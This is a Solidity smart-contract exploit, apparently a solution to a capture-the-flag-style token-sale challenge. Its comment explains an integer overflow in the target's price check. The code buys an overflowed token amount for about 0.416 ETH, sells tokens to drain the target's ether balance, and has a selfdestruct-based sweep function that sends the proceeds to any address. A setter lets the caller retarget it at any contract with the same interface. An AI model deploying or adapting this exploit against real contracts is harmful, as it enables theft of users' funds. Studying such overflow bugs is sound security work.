// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

interface ABI {
    function buy(uint256) external payable;
    function sell(uint256 numTokens) external;
}

/**
 * @title TokenSaleExploit
 * @dev 'msg.value' is compared to the amount of tokens multipled by 10**18 (1 ether) so by requesting ceil(2**256/10**18) tokens, it is possible to overflow and this token amount
 * will correspond to approximately 0.416 ETH. With this huge amount of token, we can empty the contract's balance by selling only 2 tokens matching 2 ETH.
 */
contract TokenSaleExploit {
    address token_contract = address(0x9F1247E4b7ca5492F26AfF72Db6C880076568D36);

    function setContract(address _new) public {
        token_contract = _new;
    }

    function exploit(uint256 _amount) public {
        ABI(token_contract).buy.value(415992086870360064)(115792089237316195423570985008687907853269984665640564039458); // Value is the value after overflow by ceil(2**256/10**18)
        ABI(token_contract).sell(_amount);
    }

    function sweep(address _to) public {
        selfdestruct(_to);
    }

    function TokenSaleExploit() public payable {}
    function() external payable {}
}